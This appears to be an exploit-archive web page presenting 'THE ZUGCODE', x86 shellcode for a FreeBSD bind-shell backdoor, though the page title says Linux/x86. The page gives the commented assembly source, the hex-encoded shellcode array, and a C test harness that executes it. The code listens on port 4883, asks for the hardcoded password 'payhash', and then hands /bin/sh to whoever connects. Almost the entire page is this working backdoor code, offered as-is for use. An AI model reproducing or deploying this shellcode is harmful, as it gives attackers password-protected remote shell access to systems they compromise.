<html><head><title>Linux/x86 - bind port:4883 with auth shellcode</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
THE ZUGCODE - SMALL REMOTE 6ACKD0R
FreeBSD i386 bind shell with auth
code by MahDelin
Big thx SST [kaka, nolife, white]
Listen on the port 4883 the /bin/sh
*/

/*
void zugcode(void )
{
//socket
__asm__(&quot;xorl     %eax,  %eax&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;pushl    $0x01&quot;);
__asm__(&quot;pushl    $0x02&quot;);
__asm__(&quot;movl     %esp,  %ebp&quot;);
__asm__(&quot;pushl    %ebp&quot;);
__asm__(&quot;movb     $0x61, %al&quot;);
__asm__(&quot;int      $0x80&quot;);

//struct sockaddr_in
__asm__(&quot;movl     %eax,    %edi&quot;);
__asm__(&quot;xorl     %eax,    %eax&quot;);
__asm__(&quot;movb     $0x02,   9(%ebp)&quot;);
__asm__(&quot;movw     $0x1313, 10(%ebp)&quot;);
__asm__(&quot;movl     %eax,    12(%ebp)&quot;);
__asm__(&quot;leal     8(%ebp), %ecx&quot;);

//bind
__asm__(&quot;xor      %ebx,%ebx&quot;);
__asm__(&quot;movb     $0x10,%bl&quot;);
__asm__(&quot;push     %ebx&quot;);
__asm__(&quot;push     %ecx&quot;);
__asm__(&quot;push     %edi&quot;);
__asm__(&quot;push     %eax&quot;);
__asm__(&quot;movb     $0x68, %al&quot;);
__asm__(&quot;int      $0x80&quot;);

//listen
__asm__(&quot;xor      %eax, %eax&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;pushl    $0x01&quot;);
__asm__(&quot;pushl    %edi&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;movb     $0x6a, %al&quot;);
__asm__(&quot;int      $0x80&quot;);

//accept
__asm__(&quot;xor      %eax, %eax&quot;);
__asm__(&quot;push     %ebx&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;pushl    %edi&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;movb     $0x1e, %al&quot;);
__asm__(&quot;int      $0x80&quot;);

__asm__(&quot;mov      %eax, %esi&quot;);
__asm__(&quot;xor       %eax, %eax&quot;);
__asm__(&quot;pushl     $0x203a7465&quot;);
__asm__(&quot;pushl     $0x72636573&quot;);
__asm__(&quot;movl      %esp, %ebx&quot;);
__asm__(&quot;push      %eax&quot;);
__asm__(&quot;push      $0x8&quot;);
__asm__(&quot;pushl     %ebx&quot;);
__asm__(&quot;push      %esi&quot;);
__asm__(&quot;xor       %eax, %eax&quot;);
__asm__(&quot;push      %eax&quot;);
__asm__(&quot;movb     $0x65, %al&quot;);
__asm__(&quot;int      $0x80&quot;);

//rcev password
__asm__(&quot;xor      %eax, %eax&quot;);
__asm__(&quot;pushl    %ebp&quot;);
__asm__(&quot;movl     %esp, %ebp&quot;);
__asm__(&quot;movb     $0x20, %al&quot;);
__asm__(&quot;subl     %eax,  %esp&quot;);
__asm__(&quot;xor      %eax, %eax&quot;);
__asm__(&quot;push     %eax&quot;);
__asm__(&quot;mov      $0x80, %al&quot;);
__asm__(&quot;push     %eax&quot;);
__asm__(&quot;xor      %eax, %eax&quot;);
__asm__(&quot;push     %ebp&quot;);
__asm__(&quot;push     %esi&quot;);
__asm__(&quot;push     %eax&quot;);
__asm__(&quot;movb     $0x66, %al&quot;);
__asm__(&quot;int      $0x80&quot;);

//compare password
//save registers %esi, %edi
__asm__(&quot;mov     %edi, %ebx&quot;);
__asm__(&quot;mov     %esi, %edx&quot;);
__asm__(&quot;mov     %eax, %ecx&quot;);
__asm__(&quot;.word    0x50eb&quot;);
__asm__(&quot;pop      %esi&quot;);
__asm__(&quot;mov      %ebp,     %edi&quot;);
__asm__(&quot;repe    cmpsb&quot;);
__asm__(&quot;.word    0x4275&quot;);
__asm__(&quot;mov     %ebx, %edi&quot;);
__asm__(&quot;mov     %edx, %esi&quot;);

//dup2 stdin
__asm__(&quot;xorl     %eax,  %eax&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;pushl    %esi&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;movb     $0x5a, %al&quot;);
__asm__(&quot;int      $0x80&quot;);

//dup2 stdout
__asm__(&quot;xorl     %eax,  %eax&quot;);
__asm__(&quot;inc      %eax&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;pushl    %esi&quot;);
__asm__(&quot;xorl     %eax,  %eax&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;movb     $0x5a, %al&quot;);
__asm__(&quot;int      $0x80&quot;);

//dup2 stderr
__asm__(&quot;xorl     %eax,  %eax&quot;);
__asm__(&quot;add      $0x2,  %eax&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;pushl    %esi&quot;);
__asm__(&quot;xorl     %eax,  %eax&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;movb     $0x5a, %al&quot;);
__asm__(&quot;int      $0x80&quot;);

// /bin/sh
__asm__(&quot;xor      %ecx, %ecx&quot;);
__asm__(&quot;pushl    %ecx&quot;);
__asm__(&quot;pushl    $0x68732f2f&quot;);
__asm__(&quot;pushl    $0x6e69622f&quot;);
__asm__(&quot;movl     %esp, %ebx&quot;);
__asm__(&quot;pushl    %ecx&quot;);
__asm__(&quot;pushl    %ebx&quot;);
__asm__(&quot;movl     %esp, %edx&quot;);
__asm__(&quot;pushl    %ecx&quot;);
__asm__(&quot;pushl    %edx&quot;);
__asm__(&quot;pushl    %ebx&quot;);
__asm__(&quot;pushl    %ecx&quot;);
__asm__(&quot;movb     $0x3b, %al&quot;);
__asm__(&quot;int      $0x80&quot;);

//exit
__asm__(&quot;xorl     %eax,  %eax&quot;);
__asm__(&quot;inc      %eax&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;pushl    %eax&quot;);
__asm__(&quot;int      $0x80&quot;);

__asm__(&quot;.byte  0xe8&quot;);
__asm__(&quot;.long  0xffffffab&quot;);
__asm__(&quot;.asciz \&quot;payhash\12\&quot;&quot;);
}
*/

unsigned char zug[] =
&quot;\x31\xc0\x50\x50\x6a\x01\x6a\x02\x89\xe5\x55\xb0\x61\xcd\x80\x89\xc7\x31&quot;
&quot;\xc0\xc6\x45\x09\x02\x66\xc7\x45\x0a\x13\x13\x89\x45\x0c\x8d\x4d\x08\x31&quot;
&quot;\xdb\xb3\x10\x53\x51\x57\x50\xb0\x68\xcd\x80\x31\xc0\x50\x6a\x01\x57\x50&quot;
&quot;\xb0\x6a\xcd\x80\x31\xc0\x53\x50\x50\x57\x50\xb0\x1e\xcd\x80\x89\xc6\x31&quot;
&quot;\xc0\x68\x65\x74\x3a\x20\x68\x73\x65\x63\x72\x89\xe3\x50\x6a\x08\x53\x56&quot;
&quot;\x31\xc0\x50\xb0\x65\xcd\x80\x31\xc0\x55\x89\xe5\xb0\x20\x29\xc4\x31\xc0&quot;
&quot;\x50\xb0\x80\x50\x31\xc0\x55\x56\x50\xb0\x66\xcd\x80\x89\xfb\x89\xf2\x89&quot;
&quot;\xc1\xeb\x50\x5e\x89\xef\xf3\xa6\x75\x42\x89\xdf\x89\xd6\x31\xc0\x50\x56&quot;
&quot;\x50\xb0\x5a\xcd\x80\x31\xc0\x40\x50\x56\x31\xc0\x50\xb0\x5a\xcd\x80\x31&quot;
&quot;\xc0\x83\xc0\x02\x50\x56\x31\xc0\x50\xb0\x5a\xcd\x80\x31\xc9\x51\x68\x2f&quot;
&quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89\xe2\x51\x52\x53\x51&quot;
&quot;\xb0\x3b\xcd\x80\x31\xc0\x40\x50\x50\xcd\x80\xe8\xab\xff\xff\xff\x70\x61&quot;
&quot;\x79\x68\x61\x73\x68\x0a&quot;;

main()
{
int (*zugcode)();
printf(&quot;shellcode len, %d bytes\n&quot;, strlen(zug));
zugcode = (int (*)()) zug;
(int)(*zugcode)();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
